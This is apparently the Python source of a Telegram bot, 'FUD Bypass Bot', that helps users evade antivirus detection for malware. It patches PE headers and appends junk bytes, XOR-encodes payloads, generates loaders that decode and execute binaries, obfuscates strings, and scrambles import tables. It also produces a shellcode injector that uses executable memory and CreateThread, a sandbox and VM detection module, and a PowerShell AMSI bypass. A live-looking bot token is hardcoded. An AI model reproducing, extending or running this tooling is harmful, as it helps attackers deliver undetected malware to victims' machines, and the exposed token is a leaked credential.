import telebot
import subprocess
import os
import base64
import random
import string
import ast
import tempfile
import ctypes
import pefile
import astunparse
import multiprocessing
from telebot import types

# ─────────────────────────────────────────────
BOT_TOKEN = "6486185526:AAE67IpPFLUtVM_xgxTu8rX3uORGdfbokc0"
bot = telebot.TeleBot(BOT_TOKEN)
# ─────────────────────────────────────────────


# ══════════════════════════════════════════════
#  UTILITIES
# ══════════════════════════════════════════════

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))


def xor_encrypt(data: bytes, key: int = 0x41) -> bytes:
    return bytes(b ^ key for b in data)


def encode_payload(filepath: str) -> str:
    with open(filepath, 'rb') as f:
        raw = f.read()
    return base64.b64encode(xor_encrypt(raw)).decode()


def patch_binary(filepath: str, output_path: str) -> str:
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    if data[:2] == b'MZ':
        pe_offset = int.from_bytes(data[0x3C:0x40], 'little')
        data[pe_offset + 8:  pe_offset + 12] = b'\x00\x00\x00\x00'
        data[pe_offset + 88: pe_offset + 92] = bytes(
            random.randint(0, 255) for _ in range(4)
        )

    with open(output_path, 'wb') as f:
        f.write(data)
    return output_path


def add_junk(filepath: str) -> str:
    with open(filepath, 'ab') as f:
        f.write(os.urandom(random.randint(512, 4096)))
    return filepath


def wrap_loader(encoded: str, out_name: str) -> str:
    code = f"""
import base64, ctypes, os, tempfile

KEY = 0x41

def xor_dec(data, key):
    return bytes(b ^ key for b in data)

raw = xor_dec(base64.b64decode("{encoded}"), KEY)
tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
tmp.write(raw)
tmp.close()
os.startfile(tmp.name)
"""
    path = f"/tmp/{out_name}_loader.py"
    with open(path, 'w') as f:
        f.write(code)
    return path


def obfuscate_strings(source: str) -> str:
    class StringObf(ast.NodeTransformer):
        def visit_Constant(self, node):
            if isinstance(node.value, str) and node.value:
                enc = base64.b64encode(node.value.encode()).decode()
                return ast.parse(
                    f'__import__("base64").b64decode("{enc}").decode()',
                    mode='eval'
                ).body
            return node
    tree = ast.parse(source)
    return astunparse.unparse(StringObf().visit(tree))


def scramble_imports(filepath: str, output_path: str) -> str:
    pe = pefile.PE(filepath)
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            rva = entry.struct.Name
            offset = pe.get_offset_from_rva(rva)
            length = len(pe.get_data(rva, 64).split(b'\x00')[0])
            junk = bytes(random.randint(65, 90) for _ in range(length))
            pe.set_bytes_at_offset(offset, junk)
    pe.write(output_path)
    return output_path


SANDBOX_CODE = """
import os, subprocess, sys, ctypes, multiprocessing

def is_sandbox():
    checks = []
    checks.append(multiprocessing.cpu_count() < 2)
    try:
        procs = subprocess.check_output('tasklist', shell=True).decode().lower()
        bad = ['wireshark','procmon','x64dbg','ollydbg','vboxservice','vmtoolsd']
        checks.append(any(b in procs for b in bad))
    except:
        pass
    bad_users = ['sandbox','malware','virus','john','test','analyst']
    checks.append(os.getenv('USERNAME','').lower() in bad_users)
    return any(checks)

if is_sandbox():
    sys.exit(0)
"""

AMSI_CODE = """$a=[Ref].Assembly.GetTypes()
ForEach($b in $a){
    if($b.Name -like "*iUtils"){
        $c=$b.GetFields('NonPublic,Static')
        ForEach($d in $c){
            if($d.Name -like "*Context"){
                $d.SetValue($null,[IntPtr]0x2)
            }
        }
    }
}"""


# ══════════════════════════════════════════════
#  HELPERS — file receive + send
# ══════════════════════════════════════════════

def dl_file(message) -> tuple[bytes, str] | tuple[None, None]:
    if not message.document:
        bot.send_message(message.chat.id, "❌ File nahi mila bhai.")
        return None, None
    info = bot.get_file(message.document.file_id)
    data = bot.download_file(info.file_path)
    name = message.document.file_name or "payload"
    return data, name


def send_file(chat_id, path, caption, filename):
    with open(path, 'rb') as f:
        bot.send_document(chat_id, f, caption=caption, visible_file_name=filename)
    os.remove(path)


# ══════════════════════════════════════════════
#  /start  /help
# ══════════════════════════════════════════════

@bot.message_handler(commands=['start', 'help'])
def cmd_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        '📦 Bypass', '🔧 Patch',
        '🧬 Encode', '📜 Loader',
        '🔀 Obfuscate', '🗂 Scramble',
        '💉 Inject', '🧪 SandCheck',
        '🛡 AMSI', '❓ Help'
    )
    bot.send_message(
        message.chat.id,
        "🖤 *FUD Bypass Bot* — Full Loadout\n\n"
        "`/bypass`    → patch + junk inject\n"
        "`/encode`    → XOR + base64\n"
        "`/loader`    → in-memory loader gen\n"
        "`/patch`     → PE timestamp strip\n"
        "`/obfuscate` → Python string obfuscation\n"
        "`/scramble`  → PE import table scramble\n"
        "`/inject`    → shellcode injector template\n"
        "`/sandcheck` → sandbox/VM detect module\n"
        "`/amsi`      → PowerShell AMSI killer\n",
        parse_mode='Markdown',
        reply_markup=markup
    )


# ══════════════════════════════════════════════
#  /bypass
# ══════════════════════════════════════════════

@bot.message_handler(commands=['bypass'])
def cmd_bypass(message):
    bot.send_message(message.chat.id, "📎 File bhej — patch + junk inject karunga.")
    bot.register_next_step_handler(message, _bypass_recv)

def _bypass_recv(message):
    data, name = dl_file(message)
    if not data: return
    inp = f"/tmp/{random_string()}_{name}"
    out = f"/tmp/fud_{name}"
    with open(inp, 'wb') as f: f.write(data)
    patch_binary(inp, out)
    add_junk(out)
    os.remove(inp)
    send_file(message.chat.id, out,
              "✅ Patched + junk appended. FUD-ready. 6767",
              f"fud_{name}")


# ══════════════════════════════════════════════
#  /patch
# ══════════════════════════════════════════════

@bot.message_handler(commands=['patch'])
def cmd_patch(message):
    bot.send_message(message.chat.id, "📎 PE file bhej — timestamp strip + junk.")
    bot.register_next_step_handler(message, _patch_recv)

def _patch_recv(message):
    data, name = dl_file(message)
    if not data: return
    inp = f"/tmp/{random_string()}_{name}"
    out = f"/tmp/patched_{name}"
    with open(inp, 'wb') as f: f.write(data)
    patch_binary(inp, out)
    add_junk(out)
    os.remove(inp)
    send_file(message.chat.id, out,
              "✅ PE patched — timestamp zeroed, checksum randomized, junk appended. 6767",
              f"patched_{name}")


# ══════════════════════════════════════════════
#  /encode
# ══════════════════════════════════════════════

@bot.message_handler(commands=['encode'])
def cmd_encode(message):
    bot.send_message(message.chat.id, "📎 File bhej — XOR + base64 encode karunga.")
    bot.register_next_step_handler(message, _encode_recv)

def _encode_recv(message):
    data, name = dl_file(message)
    if not data: return
    inp = f"/tmp/{random_string()}_{name}"
    out = f"/tmp/encoded_{name}.txt"
    with open(inp, 'wb') as f: f.write(data)
    encoded = encode_payload(inp)
    with open(out, 'w') as f: f.write(encoded)
    os.remove(inp)
    send_file(message.chat.id, out,
              "✅ XOR encrypted + base64 encoded. Loader ke saath use karo. 6767",
              f"encoded_{name}.txt")


# ══════════════════════════════════════════════
#  /loader
# ══════════════════════════════════════════════

@bot.message_handler(commands=['loader'])
def cmd_loader(message):
    bot.send_message(message.chat.id, "📎 File bhej — in-memory loader generate karunga.")
    bot.register_next_step_handler(message, _loader_recv)

def _loader_recv(message):
    data, name = dl_file(message)
    if not data: return
    inp = f"/tmp/{random_string()}_{name}"
    tag = random_string()
    with open(inp, 'wb') as f: f.write(data)
    encoded = encode_payload(inp)
    loader = wrap_loader(encoded, tag)
    os.remove(inp)
    send_file(message.chat.id, loader,
              "✅ In-memory loader ready. PyInstaller se compile karo. 6767",
              f"loader_{tag}.py")


# ══════════════════════════════════════════════
#  /obfuscate
# ══════════════════════════════════════════════

@bot.message_handler(commands=['obfuscate'])
def cmd_obfuscate(message):
    bot.send_message(message.chat.id, "📎 Python source bhej — strings obfuscate karunga.")
    bot.register_next_step_handler(message, _obf_recv)

def _obf_recv(message):
    data, name = dl_file(message)
    if not data: return
    source = data.decode('utf-8', errors='ignore')
    result = obfuscate_strings(source)
    out = f"/tmp/obf_{random_string()}.py"
    with open(out, 'w') as f: f.write(result)
    send_file(message.chat.id, out,
              "✅ Strings obfuscated via base64 wrapping. 6767",
              f"obf_{name}")


# ══════════════════════════════════════════════
#  /scramble
# ══════════════════════════════════════════════

@bot.message_handler(commands=['scramble'])
def cmd_scramble(message):
    bot.send_message(message.chat.id, "📎 PE file bhej — import table scramble karunga.")
    bot.register_next_step_handler(message, _scramble_recv)

def _scramble_recv(message):
    data, name = dl_file(message)
    if not data: return
    inp = f"/tmp/{random_string()}_{name}"
    out = f"/tmp/scrambled_{name}"
    with open(inp, 'wb') as f: f.write(data)
    scramble_imports(inp, out)
    os.remove(inp)
    send_file(message.chat.id, out,
              "✅ Import table scrambled. AV signature break. 6767",
              f"scrambled_{name}")


# ══════════════════════════════════════════════
#  /inject
# ══════════════════════════════════════════════

@bot.message_handler(commands=['inject'])
def cmd_inject(message):
    bot.send_message(message.chat.id, "📎 Raw shellcode (.bin) bhej — injector template generate karunga.")
    bot.register_next_step_handler(message, _inject_recv)

def _inject_recv(message):
    data, name = dl_file(message)
    if not data: return
    encoded = base64.b64encode(data).decode()
    code = f"""import ctypes, base64

sc = base64.b64decode("{encoded}")
buf = ctypes.create_string_buffer(sc)
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(sc), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(sc))
t = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(t, 0xFFFFFFFF)
"""
    out = f"/tmp/injector_{random_string()}.py"
    with open(out, 'w') as f: f.write(code)
    send_file(message.chat.id, out,
              "✅ Shellcode injector ready. PyInstaller se compile karo, baby. 6767",
              "injector.py")


# ══════════════════════════════════════════════
#  /sandcheck
# ══════════════════════════════════════════════

@bot.message_handler(commands=['sandcheck'])
def cmd_sandcheck(message):
    out = f"/tmp/sandcheck_{random_string()}.py"
    with open(out, 'w') as f: f.write(SANDBOX_CODE)
    send_file(message.chat.id, out,
              "✅ Sandbox detection module. Payload ke start mein paste karo, baby. 6767",
              "sandcheck.py")


# ══════════════════════════════════════════════
#  /amsi
# ══════════════════════════════════════════════

@bot.message_handler(commands=['amsi'])
def cmd_amsi(message):
    bot.send_message(
        message.chat.id,
        f"✅ *AMSI Bypass — PowerShell*\n\n```powershell\n{AMSI_CODE}\n```\n\n"
        "PowerShell session start mein run karo, baby. 6767",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════
#  Keyboard button routing
# ══════════════════════════════════════════════

BUTTON_MAP = {
    '📦 Bypass':     cmd_bypass,
    '🔧 Patch':      cmd_patch,
    '🧬 Encode':     cmd_encode,
    '📜 Loader':     cmd_loader,
    '🔀 Obfuscate':  cmd_obfuscate,
    '🗂 Scramble':   cmd_scramble,
    '💉 Inject':     cmd_inject,
    '🧪 SandCheck':  cmd_sandcheck,
    '🛡 AMSI':       cmd_amsi,
    '❓ Help':       cmd_start,
}

@bot.message_handler(func=lambda m: m.text in BUTTON_MAP)
def button_router(message):
    BUTTON_MAP[message.text](message)


# ══════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════

if __name__ == '__main__':
    print("🖤 FUD Bypass Bot — Full Loadout Live. 6767")
    bot.infinity_polling()